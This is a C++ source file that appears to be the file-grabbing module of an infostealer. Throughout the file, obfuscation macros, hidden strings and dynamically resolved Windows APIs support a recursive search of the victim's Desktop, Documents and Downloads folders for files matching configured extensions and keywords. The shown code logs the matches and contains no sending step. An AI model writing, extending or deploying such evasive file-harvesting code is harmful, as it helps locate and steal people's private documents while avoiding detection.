#include "FileGrabber.h"
#include "../utils/Config.h"
#include "../core/Obfuscation.h"
#include "../utils/DynamicAPI.h"
#include <filesystem>
#include <shlobj.h>
#include "../../DebugLog.h"
namespace fs = std::filesystem;
namespace Modules {
    void FileGrabber::Grab() {
        JUNK_CODE_LARGE
        SLOG("[*] Starting File Grabber search...");
        std::vector<int> folders = {CSIDL_DESKTOP, CSIDL_MYDOCUMENTS};
        for (int folder : folders) {
            char path[MAX_PATH];
            if (DynAPI::SHGetFolderA(NULL, folder, NULL, 0, path) == S_OK) {
                ScanDirectory(path);
            }
        }
        char profile[MAX_PATH];
        if (DynAPI::SHGetFolderA(NULL, CSIDL_PROFILE, NULL, 0, profile) == S_OK) {
            ScanDirectory(std::string(profile) + S("\\Downloads"));
        }
        SLOG("[+] File Grabber search complete.");
    }
    void FileGrabber::ScanDirectory(std::string path) {
        if (!fs::exists(path)) return;
        try {
            for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    std::string name = entry.path().filename().string();
                    for (auto& c : name) c = (char)tolower(c);
                    bool matchesExt = false;
                    for (const auto& e : Config::InterestingExtensions) {
                        if (ext == e) { matchesExt = true; break; }
                    }
                    if (matchesExt) {
                        for (const auto& kw : Config::Keywords) {
                            if (name.find(kw) != std::string::npos) {
                                SLOG("  [+] Found interesting file: %s", entry.path().string().c_str());
                                break;
                            }
                        }
                    }
                }
            }
        } catch(...) {}
    }
}
